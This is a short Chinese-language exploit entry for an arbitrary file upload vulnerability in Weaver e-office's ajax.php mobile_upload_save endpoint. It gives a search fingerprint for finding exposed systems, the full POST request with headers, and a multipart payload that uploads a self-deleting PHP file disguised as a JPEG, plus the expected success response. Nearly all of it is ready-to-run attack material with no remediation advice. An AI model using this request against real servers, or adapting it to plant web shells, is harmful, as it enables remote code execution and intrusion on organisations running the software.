# 泛微e-office系统ajax.php接口任意文件上传漏洞

- **系统**：泛微OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="泛微-EOffice"`
- **请求**：`POST /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=c2307d1cd1165cfacd8cd7c008f44d…`　`Cookie: testBanCookie=test; ecology_JSessionId=abcLQ67J8J80DciAxUz5y; JSESSIONID=abcLQ67…`　`Expect: 100-continue`

**请求体 / payload**
```
--c2307d1cd1165cfacd8cd7c008f44d1e
Content-Disposition: form-data; name="upload_quwan"; filename="dudesite.php."
Content-Type: image/jpeg
<?php echo "12321";unlink(__FILE__); ?>
--c2307d1cd1165cfacd8cd7c008f44d1e
Content-Disposition: form-data; name="file"; filename=""
Content-Type: application/octet-stream
--c2307d1cd1165cfacd8cd7c008f44d1e--
```
- **预期**：200　|　dudesite.php